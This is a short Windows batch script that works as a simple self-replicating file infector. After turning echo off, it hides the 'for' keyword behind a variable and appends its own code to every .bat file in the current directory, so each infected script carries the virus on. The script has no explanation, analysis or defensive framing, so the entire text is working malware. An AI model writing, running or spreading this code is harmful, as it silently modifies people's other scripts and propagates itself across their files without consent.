@echo off
set loop=for
%loop% %%f in (*.bat) do copy %%f+%0 %%f
